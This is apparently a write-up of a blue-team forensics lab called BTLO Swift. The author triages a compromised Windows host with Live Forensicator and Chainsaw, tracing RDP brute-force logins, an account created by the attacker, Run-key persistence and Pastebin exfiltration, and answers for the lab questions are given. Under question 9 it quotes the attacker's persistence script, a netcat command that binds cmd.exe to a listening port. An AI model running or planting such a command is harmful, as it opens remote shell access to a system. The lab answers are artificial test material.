# BTLO-Swift-Writeup

Lab description:

'''Use Live Forensicator, a PowerShell framework, to collect key artifacts for analysis and triage after a Windows system has been compromised. Investigate the retrieved data and find clues of what happened. '''

Readings to get familiar with tools:

https://github.com/Johnng007/Live-Forensicator

https://github.com/WithSecureLabs/chainsaw

We are given a windows machine with tools already in place:

<img width="1643" height="1180" alt="image" src="https://github.com/user-attachments/assets/e8854b44-e16e-41a4-976b-e778ecf3fac8" />


1.Run Live Forensicator using the "-EVTX EVTX" flag. Open the created output .HTML files in Chrome. According to Live Forensicator, which user accounts were locked out? (Alphabetical order)

After we run the tool using ".\Forensicator.ps1 -EVTX EVTX"

It generates a lot of report files and we need the evtx one:

<img width="706" height="282" alt="image" src="https://github.com/user-attachments/assets/85616faf-4151-40af-beaf-a3e91b408356" />

The answer is found after we get familiar with different categories of info in report:

<img width="1647" height="1017" alt="image" src="https://github.com/user-attachments/assets/ca123632-5086-425d-86b2-9dc8ba645798" />


2. Review the Lockout Policy on the machine. What is the number of failed logons before an account is locked, and what is the lockout duration?

While the tool was running, I decided to answer this since it only requires checking Local Secuirty Policy:

<img width="871" height="349" alt="image" src="https://github.com/user-attachments/assets/2e0e0f0b-0991-4417-afa5-e83938209e1a" />

We see the answers right away.

3. Which accounts were successfully accessed during the bruteforce attack?

We can look at the report and notice we have RDP logins from same IP for 2 accounts:

<img width="665" height="272" alt="image" src="https://github.com/user-attachments/assets/997ab555-01af-41d6-890c-673a57a3c3d2" />

Upon further look we see ServiceAccountBackup was created by Service Account which attacker accessed along with the Claire.Daniels account.

4. What is the IP address that conducted the bruteforce attack and accessed these accounts, and what country is it associated with?

Using the IPlookup service:

<img width="1042" height="646" alt="image" src="https://github.com/user-attachments/assets/5c8166be-07ed-47b2-ab76-1a63d5775706" />

5. What account is created by the attacker, what is the Time associated with this activity according to Live Forensicator?

Covered in previous question

6. Use Chainsaw with the -r flag and point the tool at the Live Forensics EVT output folder to further investigate the RDP bruteforce activity. How many failed logins are detected across all affected accounts?

After reading how to use the tool on github we simply run it:

<img width="933" height="468" alt="image" src="https://github.com/user-attachments/assets/9e2a341d-5871-41a5-aa2d-b604ff57d325" />

And after 0.5 seconds we have the answer.

7. What local accounts were NOT targeted in this attack, according to Chainsaw's output for Login Attacks? (Only include accounts that are likely used by humans! and no, don't include BTLO!) 

<img width="1002" height="333" alt="image" src="https://github.com/user-attachments/assets/1b1ef45d-da8b-433d-a0a5-a02137619e8a" />

When we cross-reference the previous answer with all accounts we see the answer - Claire and George weren't targeted.

8. Using Live Forensicator, identify the script that the attacker attempted to use for persistence. Submit the filepath and filename (Hint: Think about the account that is actively being used by the attacker to identify the right file!)

I decided to check system processes tab and we see:

<img width="2041" height="449" alt="image" src="https://github.com/user-attachments/assets/51829042-3017-499d-8d48-72c30ea29dce" />

Since the attacker extensively used ServiceAccount we can deduct that the script.ps1 is the right answer.

9. What are the contents of the script file?

Looked for hidden files and found nothing:

<img width="674" height="171" alt="image" src="https://github.com/user-attachments/assets/9e25f655-c181-4b0f-9694-5c26d03ca03c" />

I even searched the whole C drive and looked if it was still running in memory as a ps process, but no luck. (Edit - when I started the instance again, all the files in temp including the script loaded correctly ).

In the end I had to search for an answer in a writeup and turns out they found the file at the location!

Answer: "cmd.exe -c nc64.exe -lvp 4456 e c:\Windows\System32\cmd.exe"

10. We can't always trust the output from our tools. Manually investigate the machine's Run, RunOnce, RunServiceOnce registry keys. List the keynames where the persistence script is being executed.

We start the RegEditor and find the keys at location: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

<img width="983" height="303" alt="image" src="https://github.com/user-attachments/assets/e3b17614-a960-4465-885a-cbe3a18cf3af" />


All we need is to check which keynames attacker modified to execute the ps1 script.

11. Run Live Forensicator again using the flag to get browser history. Look at the BROWSING_HISTORY directory first, focusing on history from the compromised account used by the attacker. Three websites are a concern for data exfiltration, what are the URLs? (Alphabetical order based on subdomain or domain)

Check the folder and in the file we see:

12. Look at Live Forensicator's BrowserHistory.html output and search through the results for Pastebin. What is the URL that contains exfiltrated company data?

Running Forensicator with flag -BROWSER BROWSER and looking at the report:

13. Visit this page directly (or if it is removed, use web.archive.org). How many rows of data have been exfiltrated by the attacker? 

After opening the pastebin:


14. Revisiting the malicious script created by the attacker, according to Live Forensicator, what is the creation date for the .ps1 file?


